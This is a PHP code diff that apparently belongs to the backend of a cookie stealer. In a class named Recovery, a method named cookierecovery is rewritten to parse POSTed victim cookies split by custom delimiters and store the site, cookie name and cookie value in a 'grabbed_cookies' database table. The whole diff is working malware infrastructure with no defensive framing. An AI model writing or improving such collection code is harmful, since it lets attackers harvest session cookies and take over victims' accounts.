@@ -34,8 +34,26 @@ class Recovery
     }
 
     public function cookierecovery(){
-            var_dump($_POST);
+            $cookie =  explode("#D|C#",$_POST["cookies"]);
+            $details = explode("#dark~#",$cookie[1]);
+
+            $detailsArray = array(
+                "site" => $details[1],
+                "cookiename" => $details[2],
+                "cookie" => $details[3],
+            );
+            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM grabbed_cookies WHERE site LIKE :site AND cookiename LIKE :cookiename AND cookie LIKE :cookie");
+            $statement->execute($detailsArray);
+            $exists = $statement->fetch();
+            if(!$exists){
+                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO grabbed_cookies (site, cookiename, cookie) VALUES (:site, :cookiename, :cookie)");
+                $statement->execute($detailsArray);
+            }
+
+            //var_dump($detailsArray);
             die();
     }
+
+
 
 }
